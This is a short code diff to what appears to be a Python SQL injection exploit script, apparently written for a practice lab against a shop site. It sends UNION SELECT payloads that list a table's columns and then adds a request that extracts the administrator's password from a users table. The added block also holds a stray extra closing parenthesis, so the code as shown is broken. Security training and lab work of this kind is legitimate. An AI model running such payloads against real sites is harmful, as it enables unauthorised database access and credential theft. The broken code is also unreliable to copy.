@@ -73,13 +73,22 @@ def main(args):
     payload = format_payload(
         f"UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'"
     )
-     log.info(f"Sending SQLi Payload: {payload}")
+    log.info(f"Sending SQLi Payload: {payload}")
     
     if shop.no_proxy:
         resp = requests.post(url, data=payload)
     else:
         resp = requests.post(url, data=payload, proxies=utils.PROXIES, verify=False)
-
+    payload = format_payload(
+        "UNION SELECT password FROM users where username='administrator'"
+    )
+    )
+    log.info(f"Sending SQLi Payload: {payload}")
+    
+    if shop.no_proxy:
+        resp = requests.post(url, data=payload)
+    else:
+        resp = requests.post(url, data=payload, proxies=utils.PROXIES, verify=False)
     print(resp.text)
     
     
